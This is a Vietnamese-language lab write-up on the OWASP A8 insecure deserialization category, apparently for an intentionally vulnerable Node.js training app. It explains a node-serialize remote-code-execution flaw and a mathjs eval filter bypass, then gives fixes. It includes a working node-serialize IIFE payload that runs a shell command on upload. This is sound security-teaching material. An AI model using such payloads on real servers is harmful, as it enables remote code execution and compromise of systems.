# A8 – Insecure Deserialization

## Scenario

- Deserialize dữ liệu từ file upload tại `/bulkproductslegacy`
- Code Injection tại `/calc` (mathjs eval với bypass regex)

## Mô tả lỗ hổng

### 1. node-serialize RCE

`node-serialize` deserialize JSON có thể chứa function IIFE (Immediately Invoked Function Expression). Khi unserialize gặp `_$$ND_FUNC$$_function(){...}()`, nó **tự thực thi** hàm đó.

### 2. mathjs eval

`mathjs.eval()` trên phiên bản cũ (3.x) có thể thực thi code JavaScript tùy ý nếu bypass được regex whitelist.

## Khai thác

### node-serialize – `/bulkproductslegacy`

**Vị trí code (v1):** `core/appHandler.js`

```js
var products = serialize.unserialize(req.files.products.data.toString('utf8'))
```

**Payload file upload (`products.json`):**
```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id > /tmp/pwned')}()"}
```

**Kết quả:** Lệnh `id` được thực thi trên server khi file được upload.

### mathjs eval bypass – `/calc`

**Regex filter (v1):**
```js
var regex = /^[0-9+\-*/().\s]+$/
```

Filter chỉ cho qua số và toán tử — tuy nhiên mathjs cũ cho phép một số syntax đặc biệt bypass filter.

## Tác động (Impact)

- **RCE** — Remote Code Execution toàn quyền trên server
- Đọc/ghi file, tạo reverse shell, exfiltrate database

## Fix (v2)

### node-serialize fix:
Không dùng `node-serialize`. Thay bằng parse JSON thông thường:
```js
var products = JSON.parse(req.files.products.data.toString('utf8'))
```

JSON.parse không thực thi function, chỉ parse data.

### mathjs fix:
Nâng lên `mathjs@latest` (đã vá lỗ hổng eval) hoặc dùng thư viện tính toán an toàn hơn:
```js
const { evaluate } = require('mathjs')  // v9+ đã sandbox eval
```

## Kết quả sau fix

- Payload `_$$ND_FUNC$$_` bị lỗi JSON.parse → không thực thi
- mathjs eval được sandbox trong phiên bản mới
